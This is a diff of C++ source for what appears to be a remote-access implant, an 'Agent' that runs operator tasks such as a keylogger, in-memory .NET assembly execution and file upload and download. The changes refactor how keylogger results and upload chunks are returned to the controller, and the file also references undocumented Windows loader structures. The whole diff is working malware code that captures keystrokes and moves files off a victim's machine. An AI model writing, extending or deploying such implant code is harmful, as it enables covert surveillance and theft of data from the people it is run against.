@@ -37,6 +37,7 @@
 #include <cmath>
 #include <cstdio>
 #include <variant>
+#include <filesystem>
 
 #undef _DSA
 #pragma comment(lib, "mscoree.lib")
@@ -115,7 +116,7 @@ void Agent::Start()
                                                     {
                                                         return this->ExecuteKeylogger(
                                                             keyloggerRequest.taskID,
-                                                            keyloggerRequest.taskCode);
+                                                            keyloggerRequest.code);
                                                     },
 
                                                     [this](const TaskRequest<CommandUploadFile> &uploadRequest) -> Response
@@ -390,7 +391,7 @@ Response Agent::ExecuteNetAsm(const int &taskID, const CommandNetAsm &request)
     return CreateTaskResponse(taskID, NET_ASM, NO_CODE, SUCCESS, TaskSuccess{buffer});
 }
 
-Response Agent::ExecuteKeylogger(const int &taskID, const int &code, const CommandKeylogger &request)
+Response Agent::ExecuteKeylogger(const int &taskID, const int &code)
 {
     KeyloggerResult result;
 
@@ -404,10 +405,20 @@ Response Agent::ExecuteKeylogger(const int &taskID, const int &code, const Comma
     }
     else
     {
-        return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, ERROR, TaskError{-1, "Invalid keylogger command."});
+        return CreateTaskResponse(taskID, KEYLOGGER, NO_CODE, ERROR, TaskError{-1,"Invalid keylogger command."});
     }
 
-    return CreateTaskResponse(taskID, KEYLOGGER, code, result.status, result.result);
+    return std::visit(
+        [&](const auto& data) -> Response
+        {
+            return CreateTaskResponse(
+                taskID,
+                KEYLOGGER,
+                code,
+                result.status,
+                data);
+        },
+        result.result);
 }
 
 typedef struct _LDR_DATA_TABLE_ENTRY2
@@ -935,12 +946,7 @@ Response Agent::UploadFile(const int &taskID, const CommandUploadFile &uploadReq
         UPLOAD,
         NO_CODE,
         chunk.final ? NO_MORE_TO_FOLLOW : MORE_TO_FOLLOW,
-        TaskSuccess{
-            chunk.fileName,
-            chunk.data,
-            chunk.offset,
-            chunk.totalSize,
-            chunk.final});
+        chunk);
 }
 
 Response Agent::DownloadFile(const int &taskID, const CommandDownloadFile &downloadRequest)
